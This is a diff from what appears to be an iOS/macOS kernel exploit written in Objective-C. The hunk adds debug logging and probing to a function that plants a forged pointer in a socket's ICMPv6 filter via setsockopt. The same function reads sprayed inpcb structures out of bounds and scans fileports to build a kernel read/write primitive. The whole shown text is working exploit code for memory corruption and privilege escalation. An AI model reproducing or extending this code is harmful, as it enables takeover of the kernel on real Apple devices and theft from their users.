@@ -700,20 +700,75 @@ int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
         uint8_t pmark[0x20]; memset(pmark, 0xff, 0x20);
         *(uint64_t*)pmark = inpNext + 0x78;
         setsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, pmark, 0x20);
+        printf("[dbg] planted rw icmp6filt = inpNext+0x78 = 0x%llx\n",
+            (unsigned long long)(inpNext + 0x78));
+        fflush(stdout);
+        // Window slot summary (all 4 slots): correlate offline to find which
+        // slot is inpNext and confirm it is a live sprayed inpcb.
+        for (uint64_t dso = 0; dso + 0x400 <= OOB_SIZE; dso += 0x400) {
+            uint64_t dg = *(uint64_t*)((uintptr_t)rBuf + dso + 0x78);
+            uint64_t d20 = *(uint64_t*)((uintptr_t)rBuf + dso + 0x20);
+            uint64_t d28 = *(uint64_t*)((uintptr_t)rBuf + dso + 0x28);
+            uint64_t d40 = *(uint64_t*)((uintptr_t)rBuf + dso + 0x40);
+            uint64_t d138 = *(uint64_t*)((uintptr_t)rBuf + dso + OFFSET_ICMP6FILT);
+            printf("[dbg] slot +0x%llx: gencnt=0x%llx leNext(+0x20)=0x%llx lePrev(+0x28)=0x%llx sock(+0x40)=0x%llx filt(+0x138)=0x%llx\n",
+                (unsigned long long)dso, (unsigned long long)dg,
+                (unsigned long long)d20, (unsigned long long)d28,
+                (unsigned long long)d40, (unsigned long long)d138);
+            fflush(stdout);
+        }
+        // Read back [inpNext+0x138] through control: confirms the plant write
+        // to the rw owner's icmp6filt slot actually persisted.
+        uint8_t rb[0x20]; socklen_t rbl = 0x20;
+        int rbs = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, rb, &rbl);
+        printf("[dbg] plant readback via control: gso=%d gd0=0x%llx want=0x%llx\n",
+            rbs, *(uint64_t*)rb, (unsigned long long)(inpNext + 0x78));
+        fflush(stdout);
+        // Direct probes on the likely rw-owner indices.
+        for (int probe = -1; probe <= 2; probe++) {
+            NSUInteger pj = (NSUInteger)(csi + probe);
+            if ((int)pj < 0 || pj >= [socketPorts count]) continue;
+            if (pj == (NSUInteger)csi) continue;
+            int pfd = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[pj] unsignedLongLongValue]);
+            if (pfd < 0) {
+                printf("[dbg] probe csi%+d (j=%lu): fileport_makefd failed\n",
+                    probe, (unsigned long)pj);
+                fflush(stdout);
+                continue;
+            }
+            uint8_t pgd[0x20]; socklen_t psl = 0x20;
+            int pgso = getsockopt(pfd, IPPROTO_ICMPV6, ICMP6_FILTER, pgd, &psl);
+            printf("[dbg] probe csi%+d (j=%lu): fd=%d gso=%d gd0=0x%llx\n",
+                probe, (unsigned long)pj, pfd, pgso, *(uint64_t*)pgd);
+            fflush(stdout);
+            close(pfd);
+        }
         NSMutableSet *gset = [NSMutableSet setWithArray:(NSMutableArray*)socketPcbIds];
         int rwIdx = -1;
         NSUInteger nports = [socketPorts count];
+        NSUInteger okCount = 0;
+        NSUInteger tfdErrCount = 0;
         for (NSUInteger j = 0; j < nports && rwIdx < 0; j++) {
             if (j == (NSUInteger)csi) continue;
             int tfd = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[j] unsignedLongLongValue]);
-            if (tfd < 0) continue;
+            if (tfd < 0) { tfdErrCount++; continue; }
             uint8_t tgd[0x20]; socklen_t tsl = 0x20;
             int tgso = getsockopt(tfd, IPPROTO_ICMPV6, ICMP6_FILTER, tgd, &tsl);
             close(tfd);
             if (tgso != 0) continue;
             uint64_t t0; memcpy(&t0, tgd, 8);
+            if (okCount < 5) {
+                printf("[dbg] scan gso==0 j=%lu gd0=0x%llx\n",
+                    (unsigned long)j, (unsigned long long)t0);
+                fflush(stdout);
+            }
+            okCount++;
             if ([gset containsObject:@(t0)]) { rwIdx = (int)j; break; }
         }
+        printf("[dbg] scan done: gso==0 sockets=%lu tfdFail=%lu rwIdx=%d (nports=%lu)\n",
+            (unsigned long)okCount, (unsigned long)tfdErrCount, rwIdx,
+            (unsigned long)nports);
+        fflush(stdout);
         if (rwIdx < 0) {
             printf("[-] early KRW: no socket returned a sprayed gencnt from rw_pcb+0x78\n");
             fflush(stdout);
